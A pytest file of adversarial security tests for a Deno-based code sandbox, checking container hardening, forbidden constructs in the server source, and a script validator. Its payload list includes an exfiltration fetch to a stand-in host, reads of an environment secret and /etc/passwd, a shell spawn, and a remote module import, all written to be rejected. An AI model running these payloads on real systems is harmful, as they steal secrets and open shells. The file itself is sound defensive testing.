"""Adversarial security and contract tests for CodeSandboxRunner (AG-010 / ADR-007)."""

from __future__ import annotations

from pathlib import Path
import shutil
import subprocess

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[3]
SANDBOX_DIR = REPO_ROOT / "backend" / "CodeSandboxRunner"
COMPOSE_OVERLAY = REPO_ROOT / "docker" / "compose" / "code-mode.yml"


def test_compose_code_mode_enforces_hardened_isolation_and_internal_network() -> None:
    data = yaml.safe_load(COMPOSE_OVERLAY.read_text(encoding="utf-8"))
    assert data["networks"]["code_sandbox_net"]["internal"] is True

    svc = data["services"]["code-sandbox-runner"]
    assert "ports" not in svc, "code-sandbox-runner must NEVER publish host ports"
    assert svc["read_only"] is True
    assert svc["cap_drop"] == ["ALL"]
    assert "no-new-privileges:true" in svc["security_opt"]
    assert svc["mem_limit"] == "256m"
    assert svc["pids_limit"] == 64
    assert "volumes" not in svc, "code-sandbox-runner must NEVER mount host volumes or ./documents"
    env_keys = set((svc.get("environment") or {}).keys())
    assert not (env_keys & {"DATABASE_URL", "GROQ_API_KEY", "SECRETS_ENCRYPTION_KEY", "PGPASSWORD"})


def test_sandbox_server_forbids_eval_exec_node_vm_and_uses_deno_deny_all() -> None:
    server_src = (SANDBOX_DIR / "server.ts").read_text(encoding="utf-8")
    assert "--deny-all" in server_src
    assert "--no-remote" in server_src
    assert "--no-npm" in server_src
    assert "clearEnv: true" in server_src
    assert "--max-old-space-size=128" in server_src
    # Strictly forbid eval / exec / node:vm as sandbox boundary in executable lines
    code_lines = [
        line for line in server_src.splitlines()
        if not line.strip().startswith(("//", "*", "/*"))
    ]
    executable_src = "\n".join(code_lines)
    assert "eval(" not in executable_src
    assert "new Function(" not in executable_src
    assert "node:vm" not in executable_src


def test_static_adversarial_escape_payloads_are_rejected_by_client_policy() -> None:
    import sys

    sys.path.insert(0, str(REPO_ROOT / "backend" / "AgentOrchestratorServices"))
    from app.infrastructure.sandbox.sandbox_client import (
        CodeSandboxValidationError,
        validate_sandbox_script,
    )

    adversarial_payloads = [
        "const r = await fetch('https://exfil.example.com');",
        "const secret = Deno.env.get('DATABASE_URL');",
        "const etc = await Deno.readFile('/etc/passwd');",
        "const p = new Deno.Command('sh', { args: ['-c', 'id'] });",
        "import x from 'https://evil.example.com/mod.ts';",
        "const fs = require('fs');",
        "x" * 9000,  # Oversized payload
    ]
    for payload in adversarial_payloads:
        with pytest.raises(CodeSandboxValidationError):
            validate_sandbox_script(payload)

    # Valid deterministic transformation passes static validation
    valid_script = """
    function transform(data: { evidence: Array<{ quote: string }> }) {
      return { count: data.evidence.length };
    }
    """
    assert "transform" in validate_sandbox_script(valid_script)


@pytest.mark.skipif(shutil.which("deno") is None, reason="deno binary not installed on host (runs inside Docker/CI)")
def test_live_deno_deny_all_blocks_fs_env_and_network() -> None:
    for snippet in (
        "await Deno.readTextFile('/etc/passwd')",
        "Deno.env.toObject()",
        "await fetch('https://example.com')",
    ):
        proc = subprocess.run(
            ["deno", "eval", "--deny-all", snippet],
            capture_output=True,
            text=True,
            timeout=5,
            check=False,
        )
        assert proc.returncode != 0
